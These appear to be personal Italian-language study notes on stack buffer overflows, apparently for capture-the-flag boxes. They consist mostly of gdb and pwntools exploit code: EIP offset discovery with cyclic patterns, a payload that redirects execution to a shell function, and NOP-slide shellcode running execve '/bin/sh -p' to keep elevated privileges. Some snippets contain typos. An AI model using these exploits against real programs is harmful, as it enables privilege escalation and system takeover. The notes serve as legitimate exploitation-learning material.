```bash
gdb <PATH>
```
```gbd
r < pattern o r < <(cyclic 50)
```
Cosi trovi quanti caratteri servono per sovrascivere l'eip
```gbd
cyclic -l <fault address>
```
![[Pasted image 20230512100403.png]]
In questo caso 44

per vedere a quale eip puntare
```dbg
disassemble shell 
```
![[Pasted image 20230512100447.png]]
```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | <PATH PROGRAMMA>
```
### **SCRIPT**
```python
from pwn import *
proc = process('<PATH>')
elf = ELF('/opt/secret/root') //ELF pernette di individuare importanti indirizzi di memoria, come shell che serve a noi in questo esempio
shell_func = elf.symbols.shell
payload = fit({ //Crea il payload
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```
### **SHELLCRAFT**
```python
from pwn import *
padding = cyclic(cyclic_find(gls'))
//trova l'esp(in questo caso 0xffff....)
eip = p32(0xffffd510+200) //200 oppure 8 o 16, trovatelo, basta che punti all'eip
nop_slide = "\x90"*1000 //1000 ora ma variabile da box a box
shellcode = "\xcc"
payload = padding + eip + nop_slide + shellcode
//hitta il breakpoint
```
```bash
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
```
```python
---> shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
proc = process('./intro2pwnFinal')
proc.recvline()
proc.send(payload)
proc.interactive()
```